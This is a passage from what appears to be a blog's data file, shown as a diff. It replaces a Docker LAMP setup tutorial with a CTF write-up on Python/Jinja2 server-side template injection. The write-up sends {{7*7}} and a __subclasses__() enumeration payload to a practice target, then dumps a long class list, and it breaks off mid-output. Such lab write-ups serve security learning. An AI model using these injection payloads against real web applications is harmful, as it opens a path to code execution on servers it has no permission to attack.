-<p>输入<code>docker run -tid -p 8080:80 -p 3309:3306 -v /var/www/html:/var/www/html --name lamp linode/lamp /bin/bash</code>创建容器(-p 参数是指定端口映射 ，-v参数是指定目录映射，–name 为此容器创建名字)</p>
-<p>创建成功后查看正在运行的容器<code>docker ps</code></p>
-<p><img data-src="https://images.gaifagafin.top/202311051106900.png"></p>
-<p>输入<code>docker exec -it 16b /bin/bash</code>进入容器(16b为容器id前3位)</p>
-<p><img data-src="https://images.gaifagafin.top/202311051106366.png"></p>
-<p>和之前一样开启Apache和MySQL服务</p>
-<p><img data-src="https://images.gaifagafin.top/202311051106049.png"></p>
-<p>在浏览器访问<code>localhost:8080</code>,如果出现无法访问的情况，则需要重启docker服务(exit退出容器)，退出容器后终端输入<code>systemctl restart docker</code></p>
-<p><img data-src="https://images.gaifagafin.top/202311051106627.png"></p>
-<p>再<code>docker start 容器id</code>，重复开启Apache和MySQL服务过程，在浏览器访问<code>localhost:8080</code>页面回显证明容器中的Apache服务成功运行</p>
-<p><img data-src="https://images.gaifagafin.top/202311051106455.png"></p>
-<p>接下来测试容器中PHP服务，容器中输入<code>cd var/www/example.com/public_html</code></p>
-<p><img data-src="https://images.gaifagafin.top/202311051106861.png"></p>
-<p>输入<code>&quot;&lt;?php phpinfo(); ?&gt;&quot; &gt; 1.php</code>将测试php文件写入当前目录下</p>
-<p><img data-src="https://images.gaifagafin.top/202311051107831.png"></p>
-<p>浏览器输入<code>http://localhost:8080/1.php</code>访问测试php文件，看到回显，说明PHP服务也正常</p>
-<p><img data-src="https://images.gaifagafin.top/202311051107278.png"></p>
-<p>以上做完则成功在docker中搭建了lamp web环境</p>
+    <title>攻防世界-Web_python_template_injection</title>
+    <url>/2023/10/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-python-template-injection/</url>
+    <content><![CDATA[<p>第一次做模板注入的题目，参考H师傅的writeup <a href="https://blog.csdn.net/Mr_helloword/article/details/107949217">https://blog.csdn.net/Mr_helloword/article/details/107949217</a></p>
+<img data-src="https://images.gaifagafin.top/202311051131161.png" style="zoom:67%;" />
+
+<p>进入靶机网址提示</p>
+<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">python <span class="keyword">template</span> injection</span><br></pre></td></tr></table></figure>
+
+<p>知道这是一道python模板注入</p>
+<p>url输入 </p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:50859/&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>页面回显</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:50859/49 not found</span><br></pre></td></tr></table></figure>
+
+<p>判断存在SSTI注入</p>
+<p>查看网站模块，url输入</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:50859/&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>回显</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">URL http://<span class="number">61.147</span><span class="number">.171</span><span class="number">.105</span>:<span class="number">50859</span>/[&lt;<span class="built_in">type</span> <span class="string">&#x27;type&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakref&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakcallableproxy&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakproxy&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;int&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;basestring&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;bytearray&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;list&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;NoneType&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;NotImplementedType&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;traceback&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;super&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;xrange&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;set&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;slice&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;staticmethod&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;complex&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;float&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;buffer&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;long&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;frozenset&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;property&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;memoryview&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;tuple&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;enumerate&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;reversed&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;code&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;frame&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;builtin_function_or_method&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;instancemethod&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;function&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;classobj&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dictproxy&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;generator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;getset_descriptor&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;wrapper_descriptor&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;instance&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;ellipsis&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;member_descriptor&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;file&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;PyCapsule&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;cell&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;callable-iterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;iterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.long_info&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.float_info&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;EncodingMap&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;fieldnameiterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;formatteriterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.version_info&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.flags&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;exceptions.BaseException&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;module&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;imp.NullImporter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;zipimport.zipimporter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;posix.stat_result&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;posix.statvfs_result&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_weakrefset._IterationGuard&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_weakrefset.WeakSet&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Hashable&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;classmethod&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Iterable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Sized&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Container&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Callable&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict_keys&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict_items&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict_values&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;site._Printer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;site._Helper&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_sre.SRE_Pattern&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_sre.SRE_Match&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_sre.SRE_Scanner&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;site.Quitter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;functools.partial&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;operator.itemgetter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;operator.attrgetter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;operator.methodcaller&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;collections.deque&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;deque_iterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;deque_reverse_iterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.combinations&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.combinations_with_replacement&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.cycle&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.dropwhile&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.takewhile&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.islice&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.starmap&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.imap&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.chain&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.compress&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.ifilter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.ifilterfalse&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.count&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.izip&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.izip_longest&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.permutations&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.product&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.repeat&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.groupby&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.tee_dataobject&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.tee&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools._grouper&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_thread._localdummy&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;thread._local&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;thread.lock&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;Struct&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_json.Scanner&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_json.Encoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;json.decoder.JSONDecoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;json.encoder.JSONEncoder&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;time.struct_time&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;threading._Verbose&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;cPickle.Unpickler&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;cPickle.Pickler&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;cStringIO.StringO&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;cStringIO.StringI&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;string.Template&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;string.Formatter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ssl._SSLContext&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ssl._SSLSocket&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;socket._closedsocket&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_socket.socket&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;method_descriptor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;socket._socketobject&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;socket._fileobject&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;urlparse.ResultMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;contextlib.GeneratorContextManager&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;contextlib.closing&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.utils.MissingType&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.utils.LRUCache&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.utils.Cycler&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.utils.Joiner&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.utils.Namespace&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;markupsafe._MarkupEscapeHelper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.nodes.EvalContext&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_hashlib.HASH&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.nodes.Node&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_random.Random&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.TemplateReference&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.environment.Environment&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.Context&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.BlockReference&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.LoopContextBase&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.LoopContextIterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.Macro&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.Undefined&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;numbers.Number&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;decimal.Decimal&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;decimal._ContextManager&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;decimal.Context&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;decimal._WorkRep&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;decimal._Log10Memoize&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ast.AST&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.lexer.Failure&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.lexer.TokenStreamIterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.lexer.TokenStream&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.lexer.Lexer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.parser.Parser&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.visitor.NodeVisitor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.idtracking.Symbols&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.compiler.MacroRef&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.compiler.Frame&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.environment.Template&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.environment.TemplateModule&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.environment.TemplateExpression&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.environment.TemplateStream&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.loaders.BaseLoader&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_io._IOBase&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_io.IncrementalNewlineDecoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.bccache.Bucket&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.bccache.BytecodeCache&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.LogRecord&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.Formatter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.BufferingFormatter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.Filter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.Filterer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.PlaceHolder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.Manager&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.LoggerAdapter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;datetime.date&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;datetime.timedelta&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;datetime.time&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;datetime.tzinfo&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug._internal._Missing&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug._internal._DictAccessorProperty&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.ImmutableListMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.ImmutableDictMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.UpdateDictMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.ViewItems&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures._omd_bucket&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.Headers&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.ImmutableHeadersMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.IfRange&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.Range&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.ContentRange&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.FileStorage&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;email.LazyImporter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;calendar.Calendar&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.urls.Href&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.utils.HTMLBuilder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.accept.AcceptMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.auth.AuthorizationMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.auth.WWWAuthenticateMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wsgi.ClosingIterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wsgi.FileWrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wsgi._RangeWrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.middleware.dispatcher.DispatcherMiddleware&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.middleware.http_proxy.ProxyMiddleware&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.middleware.shared_data.SharedDataMiddleware&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.formparser.FormDataParser&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.formparser.MultiPartParser&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.base_request.BaseRequest&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.base_response.BaseResponse&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.etag.ETagRequestMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.etag.ETagResponseMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.user_agent.UserAgentMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.request.StreamOnlyMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.response.ResponseStream&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.response.ResponseStreamMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.exceptions.Aborter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;uuid.UUID&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;CArgObject&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ctypes.CThunkObject&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ctypes._CData&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ctypes.CField&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ctypes.DictRemover&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;ctypes.CDLL&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;ctypes.LibraryLoader&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;select.epoll&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;subprocess.Popen&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itsdangerous._json._CompactJSON&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itsdangerous.signer.SigningAlgorithm&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itsdangerous.signer.Signer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itsdangerous.serializer.Serializer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itsdangerous.url_safe.URLSafeSerializerMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask._compat._DeprecatedBool&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.local.Local&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.local.LocalStack&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.local.LocalManager&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.local.LocalProxy&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;ast.NodeVisitor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;difflib.HtmlDiff&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.routing.RuleFactory&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.routing.RuleTemplate&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.routing.BaseConverter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.routing.Map&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.routing.MapAdapter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click._compat._FixupStream&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click._compat._AtomicFile&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.utils.LazyFile&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.utils.KeepOpenFile&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.utils.PacifyFlushWrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.types.ParamType&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.parser.Option&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.parser.Argument&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.parser.ParsingState&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.parser.OptionParser&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.formatting.HelpFormatter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.core.Context&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.core.BaseCommand&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span 